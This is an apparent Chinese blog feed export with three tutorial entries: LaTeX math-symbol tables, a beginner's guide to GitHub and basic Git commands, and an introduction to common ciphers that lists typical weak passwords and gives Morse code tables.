align="center">$\land$</td><td align="center"><code>$\land$</code></td></tr><tr><td align="center">$\lor$</td><td align="center"><code>$\lor$</code></td></tr><tr><td align="center">$\lnot$</td><td align="center"><code>$\lnot$</code></td></tr><tr><td align="center">$\to$</td><td align="center"><code>$\to$</code></td></tr><tr><td align="center">$\rightarrow$</td><td align="center"><code>$\rightarrow$</code></td></tr><tr><td align="center">$\leftarrow$</td><td align="center"><code>$\leftarrow$</code></td></tr><tr><td align="center">$\leftrightarrow$</td><td align="center"><code>$\leftrightarrow$</code></td></tr><tr><td align="center">$\Rightarrow$</td><td align="center"><code>$\Rightarrow$</code></td></tr><tr><td align="center">$\Leftarrow$</td><td align="center"><code>$\Leftarrow$</code></td></tr><tr><td align="center">$\Leftrightarrow$</td><td align="center"><code>$\Leftrightarrow$</code></td></tr><tr><td align="center">$\top$</td><td align="center"><code>$\top$</code></td></tr><tr><td align="center">$\bot$</td><td align="center"><code>$\bot$</code></td></tr><tr><td align="center">$\vdash$</td><td align="center"><code>$\vdash$</code></td></tr><tr><td align="center">$\vDash$</td><td align="center"><code>$\vDash$</code></td></tr><tr><td align="center">$\subset$</td><td align="center"><code>$\subset$</code></td></tr><tr><td align="center">$\subseteq$</td><td align="center"><code>$\subseteq$</code></td></tr><tr><td align="center">$\subsetneq$</td><td align="center"><code>$\subsetneq$</code></td></tr><tr><td align="center">$\in$</td><td align="center"><code>$\in$</code></td></tr><tr><td align="center">$\notin$</td><td align="center"><code>$\notin$</code></td></tr><tr><td align="center">$\cup$</td><td align="center"><code>$\cup$</code></td></tr><tr><td align="center">$\cap$</td><td align="center"><code>$\cap$</code></td></tr><tr><td align="center">$\mathbb{R}$</td><td align="center"><code>$\mathbb{R}$</code></td></tr><tr><td align="center">$\mathbb{Q}$</td><td align="center"><code>$\mathbb{Q}$</code></td></tr><tr><td align="center">$\mathbb{Z}$</td><td align="center"><code>$\mathbb{Z}$</code></td></tr><tr><td align="center">$\mathbb{N}$</td><td align="center"><code>$\mathbb{N}$</code></td></tr></tbody></table><h2 id="括号"><a href="#括号" class="headerlink" title="括号"></a>括号</h2><table><thead><tr><th align="center">括号</th><th align="center">LaTex语法</th></tr></thead><tbody><tr><td align="center">$(x)$</td><td align="center"><code>$(x)$</code></td></tr><tr><td align="center">$[x]$</td><td align="center"><code>$[x]$</code></td></tr><tr><td align="center">$\{ x \}$</td><td align="center"><code>$\{ x \}$</code></td></tr><tr><td align="center">$</td><td align="center">x</td></tr><tr><td align="center">$\vert x \vert$</td><td align="center"><code>$\vert x \vert$</code></td></tr><tr><td align="center">$\Vert x \Vert$</td><td align="center"><code>$\Vert x \Vert$</code></td></tr><tr><td align="center">$\langle x \rangle$</td><td align="center"><code>$\langle x \rangle$</code></td></tr><tr><td align="center">$\lceil x \rceil$</td><td align="center"><code>$\lceil x \rceil$</code></td></tr><tr><td align="center">$\lfloor x \rfloor$</td><td align="center"><code>$\lfloor x \rfloor$</code></td></tr><tr><td align="center">$\left\lbrace\frac12\right\rbrace$</td><td align="center"><code>$\left\lbrace\frac12\right\rbrace$</code></td></tr><tr><td align="center">$\Biggl(\biggl(\Bigl(\bigl((x)\bigr)\Bigr)\biggr)\Biggr)$</td><td align="center"><code>\Biggl(\biggl(\Bigl(\bigl((x)\bigr)\Bigr)\biggr)\Biggr)</code></td></tr></tbody></table><h2 id="其他特殊字符"><a href="#其他特殊字符" class="headerlink" title="其他特殊字符"></a>其他特殊字符</h2><table><thead><tr><th align="center">符号</th><th align="center">LaTex语法</th></tr></thead><tbody><tr><td align="center">$\forall$</td><td align="center"><code>$\forall$</code></td></tr><tr><td align="center">$\exists$</td><td align="center"><code>$\exists$</code></td></tr><tr><td align="center">$\infty$</td><td align="center"><code>$\infty$</code></td></tr><tr><td align="center">$\emptyset$</td><td align="center"><code>$\emptyset$</code></td></tr><tr><td align="center">$\varnothing$</td><td align="center"><code>$\varnothing$</code></td></tr><tr><td align="center">$\nabla$</td><td align="center"><code>$\nabla$</code></td></tr><tr><td align="center">$\angle$</td><td align="center"><code>$\angle$</code></td></tr><tr><td align="center">$\because$</td><td align="center"><code>$\because$</code></td></tr><tr><td align="center">$\therefore$</td><td align="center"><code>$\therefore$</code></td></tr><tr><td align="center">$\vdash$</td><td align="center"><code>$\vdash$</code></td></tr><tr><td align="center">$\vDash$</td><td align="center"><code>$\vDash$</code></td></tr><tr><td align="center">$\nvDash$</td><td align="center"><code>$\nvDash$</code></td></tr></tbody></table><h2 id="希腊字母"><a href="#希腊字母" class="headerlink" title="希腊字母"></a>希腊字母</h2><table><thead><tr><th align="center">大写</th><th align="center">LaTex语法</th><th align="center">小写</th><th align="center">LaTex语法</th></tr></thead><tbody><tr><td align="center">$\Alpha$</td><td align="center"><code>$\Alpha$</code></td><td align="center">$\alpha$</td><td align="center"><code>$\alpha$</code></td></tr><tr><td align="center">$\Beta$</td><td align="center"><code>$\Beta$</code></td><td align="center">$\beta$</td><td align="center"><code>$\beta$</code></td></tr><tr><td align="center">$\Gamma$</td><td align="center"><code>$\Gamma$</code></td><td align="center">$\gamma$</td><td align="center"><code>$\gamma$</code></td></tr><tr><td align="center">$\Delta$</td><td align="center"><code>$\Delta$</code></td><td align="center">$\delta$</td><td align="center"><code>$\delta$</code></td></tr><tr><td align="center">$\Epsilon$</td><td align="center"><code>$\Epsilon$</code></td><td align="center">$\epsilon$</td><td align="center"><code>$\epsilon$</code></td></tr><tr><td align="center"></td><td align="center"></td><td align="center">$\varepsilon$</td><td align="center"><code>$\varepsilon$</code></td></tr><tr><td align="center">$\Zeta$</td><td align="center"><code>$\Zeta$</code></td><td align="center">$\zeta$</td><td align="center"><code>$\zeta$</code></td></tr><tr><td align="center">$\Eta$</td><td align="center"><code>$\Eta$</code></td><td align="center">$\eta$</td><td align="center"><code>$\eta$</code></td></tr><tr><td align="center">$\Theta$</td><td align="center"><code>$\Theta$</code></td><td align="center">$\theta$</td><td align="center"><code>$\theta$</code></td></tr><tr><td align="center">$\Iota$</td><td align="center"><code>$\Iota$</code></td><td align="center">$\iota$</td><td align="center"><code>$\iota$</code></td></tr><tr><td align="center">$\Kappa$</td><td align="center"><code>$\Kappa$</code></td><td align="center">$\kappa$</td><td align="center"><code>$\kappa$</code></td></tr><tr><td align="center">$\Lambda$</td><td align="center"><code>$\lambda$</code></td><td align="center">$\lambda$</td><td align="center"><code>$\lambda$</code></td></tr><tr><td align="center">$\Mu$</td><td align="center"><code>$\Mu$</code></td><td align="center">$\mu$</td><td align="center"><code>$\mu$</code></td></tr><tr><td align="center">$\Nu$</td><td align="center"><code>$\Nu$</code></td><td align="center">$\nu$</td><td align="center"><code>$\nu$</code></td></tr><tr><td align="center">$\Xi$</td><td align="center"><code>$\Xi$</code></td><td align="center">$\xi$</td><td align="center"><code>$\xi$</code></td></tr><tr><td align="center">$\Omicron$</td><td align="center"><code>$\Omicron$</code></td><td align="center">$\omicron$</td><td align="center"><code>$\omicron$</code></td></tr><tr><td align="center">$\Pi$</td><td align="center"><code>$\Pi$</code></td><td align="center">$\pi$</td><td align="center"><code>$\pi$</code></td></tr><tr><td align="center">$\Rho$</td><td align="center"><code>$\Rho$</code></td><td align="center">$\rho$</td><td align="center"><code>$\rho$</code></td></tr><tr><td align="center">$\Sigma$</td><td align="center"><code>$\Sigma$</code></td><td align="center">$\sigma$</td><td align="center"><code>$\sigma$</code></td></tr><tr><td align="center">$\Tau$</td><td align="center"><code>$\Tau$</code></td><td align="center">$\tau$</td><td align="center"><code>$\tau$</code></td></tr><tr><td align="center">$\Upsilon$</td><td align="center"><code>$\Upsilon$</code></td><td align="center">$\upsilon$</td><td align="center"><code>$\upsilon$</code></td></tr><tr><td align="center">$\Phi$</td><td align="center"><code>$\Phi$</code></td><td align="center">$\phi$</td><td align="center"><code>$\phi$</code></td></tr><tr><td align="center"></td><td align="center"></td><td align="center">$\varphi$</td><td align="center"><code>$\varphi$</code></td></tr><tr><td align="center">$\Chi$</td><td align="center"><code>$\Chi$</code></td><td align="center">$\chi$</td><td align="center"><code>$\chi$</code></td></tr><tr><td align="center">$\Psi$</td><td align="center"><code>$\Psi$</code></td><td align="center">$\psi$</td><td align="center"><code>$\psi$</code></td></tr><tr><td align="center">$\Omega$</td><td align="center"><code>$\Omega$</code></td><td align="center">$\omega$</td><td align="center"><code>$\omega$</code></td></tr></tbody></table><h1 id="常用公式"><a href="#常用公式" class="headerlink" title="常用公式"></a>常用公式</h1><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><h3 id="一元函数"><a href="#一元函数" class="headerlink" title="一元函数"></a>一元函数</h3><p>eg1:<br>$$<br>y = x \ \ (x \subset \mathbb{R})<br>$$<br>eg2:<br>$$<br>y = x^2 \ \ (x \subset \mathbb{R})<br>$$<br>eg3:<br>$$<br>y = |x| \ \ (x \subset \mathbb{R})<br>$$</p><h3 id="多元函数"><a href="#多元函数" class="headerlink" title="多元函数"></a>多元函数</h3><p>eg1:<br>$$<br>y = a + b \ \ (a \subset \mathbb{R},b \subset \mathbb{R})<br>$$<br>eg2:<br>$$<br>y = 2a^2 + b^2 \ \ (a \subset \mathbb{R},b \subset \mathbb{R})<br>$$<br>eg3:<br>$$<br>y = |a| - 2b \ \ (a \subset \mathbb{R},b \subset \mathbb{R})<br>$$</p><h3 id="三角函数-1"><a href="#三角函数-1" class="headerlink" title="三角函数"></a>三角函数</h3><p>eg1:<br>$$<br>y = \sin x \ + \ \frac{\pi}{6} \ \ ( -\pi \leq x \leq \pi )<br>$$<br>eg2:<br>$$<br>y = \cos(x + \frac{\pi}{6}) \ \ ( -\pi \leq x \leq \pi )<br>$$</p><h3 id="分段函数"><a href="#分段函数" class="headerlink" title="分段函数"></a>分段函数</h3><p>eg1:<br>$$<br>f(x)=<br>\begin{cases}<br>1 &amp; x \geq 0 \<br>0 &amp; x &lt; 0<br>\end{cases}<br>$$<br>eg2:<br>$$<br>c(u)=<br>\begin{cases}<br>\sqrt\frac{1}{N}，u = 0 \\<br>\sqrt\frac{2}{N}，u \neq 0<br>\end{cases}<br>$$</p><h2 id="等式"><a href="#等式" class="headerlink" title="等式"></a>等式</h2><p>eg1:<br>$$<br>1 + 1 = 2<br>$$<br>eg2:<br>$$<br>1 \div 2 = \frac{1}{2} = 0.5<br>$$</p><p>eg3:</p><p>eg4:<br>$$<br>\sum_{i=0}^n i^2 = \frac{(n^2+n)(2n+1)}{6}<br>$$<br>eg5:<br>$$<br>e^{i\pi} + 1 = 0<br>$$</p><h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><p>参考链接：</p><p><a href="https://blog.csdn.net/Ernest_YN/article/details/84064233#31__195" target="_blank" rel="noopener">如何用在Typora中添加数学公式?</a></p><p><a href="https://math.meta.stackexchange.com/questions/5020/mathjax-basic-tutorial-and-quick-reference/5044%20MathJax%20basic%20tutorial%20and%20quick%20reference" target="_blank" rel="noopener">MathJax basic tutorial and quick reference</a></p>]]></content>
      
      
      <categories>
          
          <category> 软件使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Markdown </tag>
            
            <tag> Typora </tag>
            
            <tag> 数学表达式 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Git和GitHub</title>
      <link href="/2020/09/02/git-he-github/"/>
      <url>/2020/09/02/git-he-github/</url>
      
        <content type="html"><![CDATA[<h1 id="使用GitHub"><a href="#使用GitHub" class="headerlink" title="使用GitHub"></a>使用GitHub</h1><h2 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h2><p>​        借助GitHub托管项目代码</p><h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><h3 id="仓库（Repository）"><a href="#仓库（Repository）" class="headerlink" title="仓库（Repository）"></a>仓库（Repository）</h3><p>​        仓库即你的项目，你想在Github上开源一个项目，那就必须新建一个Repository，如果你的开源项目多了，你就拥有多个Repositories。</p><h3 id="收藏（Star）"><a href="#收藏（Star）" class="headerlink" title="收藏（Star）"></a>收藏（Star）</h3><p>​        star意为收藏项目的人数，收藏项目方便再次查看，在GitHub上如果你有一个项目获得100个star都算很不容易了！</p><h3 id="复制克隆项目（Fork）"><a href="#复制克隆项目（Fork）" class="headerlink" title="复制克隆项目（Fork）"></a>复制克隆项目（Fork）</h3><p>​        你开源了一个项目，别人想在你这个项目的基础上做一些改进，然后应用到自己的项目中，这个时候他就可以Fork你的项目，然后他的Github主页上就多了一个项目，只不过这个项目是基于你的项目基础（<strong>本质上是在原有项目的基础上新建了一个分支</strong>），他就可以随心所欲的去改进，但是丝毫不会影响原有项目的代码与结构。</p><h3 id="发起请求（Pull-Request）"><a href="#发起请求（Pull-Request）" class="headerlink" title="发起请求（Pull Request）"></a><strong>发起请求（Pull Request）</strong></h3><p>​        发起请求，这个其实是基于Fork的。如果别人在你的基础上做了改进，后来觉得改进不错，应该要把这些改进让更多人收益，于是就像把他的改进合并到原有项目里，这个时候他就可以发起一个Pull  Request（简称PR），原有项目的创建人，就可以收到这个请求，这个时候创建人会仔细review他的代码，并且测试觉得OK，就会接受他的PR，这个时候他做的改进原有项目就会拥有。</p><h3 id="关注（Watch）"><a href="#关注（Watch）" class="headerlink" title="关注（Watch）"></a><strong>关注（Watch）</strong></h3><p>​        如果你Watch了某个项目，那么以后只要这个项目有任何更新，你都会第一时间收到关于这个项目的通知提醒。</p><h3 id="事务卡片（Issue）"><a href="#事务卡片（Issue）" class="headerlink" title="事务卡片（Issue）"></a><strong>事务卡片（Issue）</strong></h3><p>​        发现代码Bug，但是目前没有成型代码，需要讨论时用。你开源了一个项目，别人发现你的项目中有bug，后者哪些地方做的不够好，他就可以给你提一个Issue，即问题，提的问题多了，也就是Issues，然后你看到了这些问题就可以逐个去修复，修复OK了就可以一个一个的close掉。</p><h3 id="Github主页"><a href="#Github主页" class="headerlink" title="Github主页"></a><strong>Github主页</strong></h3><p>​        账号创建成功或点击网址导航栏GitHub图标即可进入GitHub主页，该主页左侧主要显示用户动态以及关注用户或关注仓库的动态，右侧显示所有Git库。</p><h3 id="仓库主页"><a href="#仓库主页" class="headerlink" title="仓库主页"></a><strong>仓库主页</strong></h3><p>​        仓库主页主要显示项目的信息，如：项目代码、版本、收藏/关注/Fork等情况。</p><h3 id="个人主页"><a href="#个人主页" class="headerlink" title="个人主页"></a><strong>个人主页</strong></h3><p>​        个人信息：头像、个人简介、关注我的人、我关注的人、我关注的Git库、我的开源项目、我贡献的开源项目等信息</p><h2 id="注册GitHub账号"><a href="#注册GitHub账号" class="headerlink" title="注册GitHub账号"></a>注册GitHub账号</h2><h3 id="官方网址"><a href="#官方网址" class="headerlink" title="官方网址"></a>官方网址</h3><p><a href="https://github.com/" target="_blank" rel="noopener">GitHub</a></p><h3 id="操作步骤"><a href="#操作步骤" class="headerlink" title="操作步骤"></a>操作步骤</h3><p><strong>GitHub主界面</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/Git/GitHub主页界面(en).png" alt="GitHub主页界面(en)"></center><p><strong>GitHub注册界面</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/Git/GitHub注册界面.png" alt="GitHub注册界面"></center><p><strong>注册成功后进入GitHub主界面</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/Git/注册成功后进入GitHub主界面.png" alt="注册成功后进入GitHub主界面"></center><p>注：</p><ul><li>因为GitHub在国外服务器所以访问较慢或者无法访问，需要翻墙（Shadowsocks）</li><li>私有仓库只能自己或者指定的朋友才有权限操作（私有仓库的收费的）</li><li>新注册的用户<strong>必须验证邮箱</strong>后才可以创建Git库仓库</li></ul><h2 id="创建仓库-创建新项目"><a href="#创建仓库-创建新项目" class="headerlink" title="创建仓库/创建新项目"></a>创建仓库/创建新项目</h2><p>​        <font color="red">创建仓库/闯进啊新项目之前必须认证邮箱</font></p><p>新建仓库</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/Git/新建仓库.png" alt="新建仓库"></center><p>仓库主页</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/Git/仓库主页.png" alt="仓库主页"></center><h2 id="仓库管理"><a href="#仓库管理" class="headerlink" title="仓库管理"></a>仓库管理</h2><h3 id="创建文件"><a href="#创建文件" class="headerlink" title="创建文件"></a>创建文件</h3><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/Git/创建新文件.png" alt="创建新文件"></center><p>创建新文件后跳转至test仓库主页</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/Git/创建新文件后跳转值test仓库主页.png" alt="创建新文件后跳转值test仓库主页"></center><h3 id="修改文件"><a href="#修改文件" class="headerlink" title="修改文件"></a>修改文件</h3><p>在仓库中点击要修改的文件名后进入文件详情页面</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/Git/修改文件-文件详情页.png" alt="修改文件-文件详情页"></center><p>点击文件详情页中的触笔后，进入修改文件页，在其中对文件内容进行修改后，需提交修改信息</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/Git/修改文件-修改文件内容页.png" alt="修改文件-修改文件内容页"></center><h3 id="删除文件"><a href="#删除文件" class="headerlink" title="删除文件"></a>删除文件</h3><p>在仓库主页中点击文件名进入文件详情页，点击删除图标</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/Git/删除文件-文件详情页.png" alt="删除文件-文件详情页"></center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/Git/删除文件-删除描述.png" alt="删除文件-删除描述"></center><h3 id="上传文件"><a href="#上传文件" class="headerlink" title="上传文件"></a>上传文件</h3><p>在仓库主页点击上传文件按钮</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/Git/上传文件-仓库主页.png" alt="上传文件-仓库主页"></center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/Git/上传文件-上传文件编辑页.png" alt="上传文件-上传文件编辑页"></center><h3 id="搜索文件"><a href="#搜索文件" class="headerlink" title="搜索文件"></a>搜索文件</h3><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/Git/搜索文件.png" alt="搜索文件"></center><h3 id="下载-检出项目"><a href="#下载-检出项目" class="headerlink" title="下载/检出项目"></a>下载/检出项目</h3><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/Git/下载项目.png" alt="下载项目"></center><h2 id="GitHub-Issues"><a href="#GitHub-Issues" class="headerlink" title="GitHub Issues"></a>GitHub Issues</h2><p>作用：发现代码Bug，但是目前没有成型代码，需要讨论时用；或者使用开源项目出现问题时使用</p><h3 id="新建Issue"><a href="#新建Issue" class="headerlink" title="新建Issue"></a>新建Issue</h3><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/Git/Issue.png" alt="Issue"></center><h3 id="提交-关闭Issue"><a href="#提交-关闭Issue" class="headerlink" title="提交/关闭Issue"></a>提交/关闭Issue</h3><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/Git/Issue-提交或关闭.png" alt="Issue-提交或关闭"></center><h1 id="使用Git"><a href="#使用Git" class="headerlink" title="使用Git"></a>使用Git</h1><h2 id="Git基本工作流程"><a href="#Git基本工作流程" class="headerlink" title="Git基本工作流程"></a>Git基本工作流程</h2><h3 id="Git工作区"><a href="#Git工作区" class="headerlink" title="Git工作区"></a>Git工作区</h3><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/Git/Git工作区.png" alt="Git工作区"></center><h3 id="向仓库中添加文件流程"><a href="#向仓库中添加文件流程" class="headerlink" title="向仓库中添加文件流程"></a>向仓库中添加文件流程</h3><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/Git/Git向仓库中添加文件流程.png" alt="Git向仓库中添加文件流程"></center><h2 id="Git初始化及仓库创建和操作"><a href="#Git初始化及仓库创建和操作" class="headerlink" title="Git初始化及仓库创建和操作"></a>Git初始化及仓库创建和操作</h2><h3 id="基本信息设置"><a href="#基本信息设置" class="headerlink" title="基本信息设置"></a>基本信息设置</h3><p>设置用户名：</p><pre class=" language-git"><code class="language-git">git config --global user.name <span class="token string">'Pleione-Plus'</span></code></pre><p>设置用户名邮箱：</p><pre class=" language-git"><code class="language-git">git config --global user.email <span class="token string">'2603350388@qq.com'</span></code></pre><h3 id="初始化一个新的Git仓库"><a href="#初始化一个新的Git仓库" class="headerlink" title="初始化一个新的Git仓库"></a>初始化一个新的Git仓库</h3><ol><li>新建一个文件夹</li><li>在文件夹内初始化git（创建git仓库）</li></ol><pre class=" language-git"><code class="language-git">mkdir democd demogit init</code></pre><p>注：</p><ul><li>初始化仓库后，文件夹内生成一个.git的隐藏文件</li></ul><h3 id="向仓库添加文件"><a href="#向仓库添加文件" class="headerlink" title="向仓库添加文件"></a>向仓库添加文件</h3><pre class=" language-git"><code class="language-git">git statustouch a.phpgit statusgit add a.phpgit statusgit commit -m <span class="token string">'add a.php'</span></code></pre><h3 id="修改仓库文件"><a href="#修改仓库文件" class="headerlink" title="修改仓库文件"></a>修改仓库文件</h3><pre class=" language-git"><code class="language-git">git statusvi a.phpgit statusgit add a.phpgit statusgit commit -m <span class="token string">'add a.php'</span></code></pre><h3 id="删除仓库文件"><a href="#删除仓库文件" class="headerlink" title="删除仓库文件"></a>删除仓库文件</h3><p>删除文件</p><pre class=" language-git"><code class="language-git">rm -rf a.php</code></pre><p>从Git中华删除文件</p><pre class=" language-git"><code class="language-git">git rm a.php</code></pre><p>提交操作</p><pre class=" language-git"><code class="language-git">git commit -m <span class="token string">'提交描述'</span></code></pre><h2 id="Git远程仓库"><a href="#Git远程仓库" class="headerlink" title="Git远程仓库"></a>Git远程仓库</h2><h3 id="使用远程仓库目的"><a href="#使用远程仓库目的" class="headerlink" title="使用远程仓库目的"></a>使用远程仓库目的</h3><p>作用：备份，实现代码共享集中化管理</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/Git/Git远程仓库.png" alt="Git远程仓库"></center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/Git/将本地仓库同步到远程仓库.png" alt="将本地仓库同步到远程仓库"></center><h3 id="Git克隆操作"><a href="#Git克隆操作" class="headerlink" title="Git克隆操作"></a>Git克隆操作</h3><p>目的：</p><p>​        将远程仓库（github对应的项目）复制到本地</p><p>代码：</p><pre class=" language-git"><code class="language-git">git clone 仓库地址</code></pre><h3 id="将本地仓库同步到git远程仓库中"><a href="#将本地仓库同步到git远程仓库中" class="headerlink" title="将本地仓库同步到git远程仓库中"></a>将本地仓库同步到git远程仓库中</h3><pre class=" language-git"><code class="language-git">git push</code></pre>]]></content>
      
      
      <categories>
          
          <category> 软件使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Git </tag>
            
            <tag> GitHub </tag>
            
            <tag> 代码托管 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常见密码简述</title>
      <link href="/2020/09/02/chang-jian-mi-ma-jian-shu/"/>
      <url>/2020/09/02/chang-jian-mi-ma-jian-shu/</url>
      
        <content type="html"><![CDATA[<h1 id="古典密码"><a href="#古典密码" class="headerlink" title="古典密码"></a>古典密码</h1><h2 id="弱密码"><a href="#弱密码" class="headerlink" title="弱密码"></a>弱密码</h2><p>​        所谓弱密码，一般对弱密码的界定，包括用户名和密码一致，密码<strong>小于6位</strong>，单纯用<strong>单词</strong>、<strong>字母</strong>或<strong>数字</strong>做密码，键盘上的<strong>连接字符</strong>如qwerty。另外，用<strong>姓名</strong>、<strong>生日</strong>、<strong>手机号码</strong>等做密码也很容易被破解。</p><p>​        <strong>密码字典</strong>，是网络上用来破解密码的工具，它将数字、字母等随机生成各种组合，然后复制到WORD上，供破解者匹对。</p><p><strong>弱密码举例</strong>：</p><ul><li>000000</li><li>111111</li><li>11111111</li><li>654321</li><li>666666</li><li>888888</li><li>abcdef</li><li>abcabc</li><li>abc123</li><li>a1b2c3</li><li>aaa111</li><li>123qwe</li><li>qwerty</li><li>qweasd</li><li>admin</li><li>password</li><li>p@ssword</li><li>passwd</li><li>iloveyou</li><li>5201314</li><li>…</li></ul><h2 id="摩斯密码"><a href="#摩斯密码" class="headerlink" title="摩斯密码"></a>摩斯密码</h2><p>​        摩斯密码（Morse Code），又称为莫尔斯电码，是一种<strong>时通时断的信号代码</strong>，通过不同的排列顺序来表达不同的<strong>英文字母</strong>、<strong>数字</strong>和<strong>标点符号</strong>。摩斯密码是一种早期的数字化通信形式，但它不同于现代只使用零和一两种状态的二进制代码，它的代码包括五种：<strong>点</strong>、<strong>划</strong>、<strong>点和划之间的停顿</strong>、<strong>每个字符之间短的停顿</strong>、<strong>每个词之间中等的停顿以及句子之间长的停顿</strong>。（<font color="blue">现代摩尔斯电码中只使用点和线</font>）</p><p>​        摩斯密码由两种基本信号和不同的间隔时间组成：短促的点信号<strong>“$\cdot$”(Dit)</strong>；保持一定时间的长信号<strong>“-“(Dah)</strong>。间隔时间：<strong>滴：1t；嗒：3t；嘀嗒间：1t；字符间：3t；字间：7t</strong>。</p><center>表1.1 摩斯密码-字母表</center><table><thead><tr><th align="center">字母</th><th align="center">密码</th><th align="center">字母</th><th align="center">密码</th></tr></thead><tbody><tr><td align="center">A</td><td align="center"><strong>· -</strong></td><td align="center">N</td><td align="center"><strong>- ·</strong></td></tr><tr><td align="center">B</td><td align="center"><strong>- · · ·</strong></td><td align="center">O</td><td align="center"><strong>- - -</strong></td></tr><tr><td align="center">C</td><td align="center"><strong>- · - ·</strong></td><td align="center">P</td><td align="center"><strong>· - - ·</strong></td></tr><tr><td align="center">D</td><td align="center"><strong>- · ·</strong></td><td align="center">Q</td><td align="center"><strong>- - · -</strong></td></tr><tr><td align="center">E</td><td align="center"><strong>·</strong></td><td align="center">R</td><td align="center"><strong>· - ·</strong></td></tr><tr><td align="center">F</td><td align="center"><strong>· · - ·</strong></td><td align="center">S</td><td align="center"><strong>· · ·</strong></td></tr><tr><td align="center">G</td><td align="center"><strong>- - ·</strong></td><td align="center">T</td><td align="center"><strong>-</strong></td></tr><tr><td align="center">H</td><td align="center"><strong>· · · ·</strong></td><td align="center">U</td><td align="center"><strong>· · -</strong></td></tr><tr><td align="center">I</td><td align="center"><strong>· ·</strong></td><td align="center">V</td><td align="center"><strong>· · · -</strong></td></tr><tr><td align="center">J</td><td align="center"><strong>· - - -</strong></td><td align="center">W</td><td align="center"><strong>· - -</strong></td></tr><tr><td align="center">K</td><td align="center"><strong>- · -</strong></td><td align="center">X</td><td align="center"><strong>- · · -</strong></td></tr><tr><td align="center">L</td><td align="center"><strong>· - · ·</strong></td><td align="center">Y</td><td align="center"><strong>- · - -</strong></td></tr><tr><td align="center">M</td><td align="center"><strong>- -</strong></td><td align="center">Z</td><td align="center"><strong>- - · ·</strong></td></tr></tbody></table><center>表1.2 摩斯密码-数字</center><table><thead><tr><th align="center">数字</th><th align="center">密码</th><th align="center">数字</th><th align="center">密码</th></tr></thead><tbody><tr><td align="center">1</td><td align="center"><strong>· - - - -</strong></td><td align="center">6</td><td align="center"><strong>- · · · ·</strong></td></tr><tr><td align="center">2</td><td align="center"><strong>· · - - -</strong></td><td align="center">7</td><td align="center"><strong>- - · · ·</strong></td></tr><tr><td align="center">3</td><td align="center"><strong>· · · - -</strong></td><td align="center">8</td><td align="center"><strong>- - - · ·</strong></td></tr><tr><td align="center">4</td><td align="center"><strong>· · · · -</strong></td><td align="center">9</td><td align="center"><strong>- - - - ·</strong></td></tr><tr><td align="center">5</td><td align="center"><strong>· · · · ·</strong></td><td align="center">0</td><td align="center"><strong>- - - - -</strong></td></tr></tbody></table><center>表1.3 摩斯密码-标点符号</center><table><thead><tr><th align="center">标点符号</th><th align="center">密码</th><th align="center">标点符号</th><th align="center">密码</th></tr></thead><tbody><tr><td align="center">.(句号)</td><td align="center"><strong>· - · - · -</strong></td><td align="center">;(分号)</td><td align="center"><strong>- · - · - ·</strong></td></tr><tr><td align="center">,(逗号)</td><td align="center"><strong>- - · · - -</strong></td><td align="center">?(问号)</td><td align="center"><strong>· · - - · ·</strong></td></tr><tr><td align="center">‘(单引号)</td><td align="center"><strong>· - - - - ·</strong></td><td align="center">-(连字符)</td><td align="center"><strong>- · · · · -</strong></td></tr><tr><td align="center">:(冒号)</td><td align="center"><strong>- - - · · ·</strong></td><td align="center">=(等号)</td><td align="center"><strong>- · · · -</strong></td></tr><tr><td align="center">/(斜线)</td><td align="center"><strong>- · · - ·</strong></td><td align="center">!(感叹号)</td><td align="center"><strong>- · - · - -</strong></td></tr><tr><td align="center">_(下划线)</td><td align="center"><strong>· · - - · -</strong></td><td align="center">“(双引号)</td><td align="center"><strong>· - · · - ·</strong></td></tr><tr><td align="center">（</td><td align="center"><strong>- · - - ·</strong></td><td align="center">)</td><td align="center"><strong>- · - - · -</strong></td></tr><tr><td align="center">$</td><td align="center"><strong>· · · - · · -</strong></td><td align="center">&amp;</td><td align="center"><strong>·  · · ·</strong></td></tr><tr><td align="center">@</td><td align="center"><strong>· - - · - ·</strong></td><td align="center"></td><td align="center"></td></tr></tbody></table><center>表1.4 摩斯密码-特殊符号</center><table><thead><tr><th align="center">特殊符号</th><th align="center">密码</th><th align="center">特殊符号</th><th align="center">密码</th></tr></thead><tbody><tr><td align="center">AR(停止，消息结束)</td><td align="center"><strong>· - · - ·</strong></td><td align="center">BT(分隔符)</td><td align="center"><strong>- · · · -</strong></td></tr><tr><td align="center">AS(等待)</td><td align="center"><strong>· - · · ·</strong></td><td align="center">(我将重新发送最后一个单词)</td><td align="center">· · · - 